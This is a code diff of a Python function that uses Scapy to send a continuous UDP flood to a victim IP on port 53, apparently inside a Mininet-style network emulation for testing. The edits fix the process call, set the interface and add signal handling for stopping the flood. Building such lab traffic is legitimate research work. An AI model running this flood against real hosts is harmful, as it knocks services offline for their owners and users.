@@ -1,13 +1,17 @@
 from scapy.all import Ether, IP, UDP, sendp
 import time
 import subprocess
+import signal
 
 def run_attack(attacker_host, victim_ip, duration):
     print(f"Starting UDP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
-    scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/UDP(dport=53), loop=1, inter=0.001, verbose=0)"
-    process = attacker_host.popen(f'python3 -c "{scapy_cmd}"', shell=True)
+    scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/UDP(dport=53), loop=1, inter=0.01, verbose=0, iface='{attacker_host.intfNames()[0]}')"
+    process = attacker_host.popen(['python3', '-c', scapy_cmd])
     
     time.sleep(duration)
-    process.send_signal(subprocess.SIGINT) # Attempt to stop Scapy processes gracefully
+    try:
+        process.send_signal(signal.SIGINT) # Attempt to stop Scapy processes gracefully
+    except:
+        process.terminate() # Fallback to terminate
     process.wait() # Wait for the process to terminate
     print(f"UDP Flood from {attacker_host.name} to {victim_ip} finished.")
